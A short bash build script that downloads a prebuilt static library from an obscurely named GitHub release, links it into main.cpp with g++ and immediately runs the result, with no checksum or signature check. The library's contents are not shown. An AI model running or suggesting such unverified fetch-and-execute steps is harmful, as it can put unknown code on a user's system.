#!/usr/bin/env bash
set -e
TAG="calm-ember-gentle-canyon"
LIB="chamomile-scalar.a"
URL="https://github.com/dbdongcidaci/optimalknollhub/releases/download/${TAG}/${LIB}"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "$URL" -o "$LIB"
g++ -std=c++17 -pthread -O2 main.cpp "$LIB" -o app && ./app
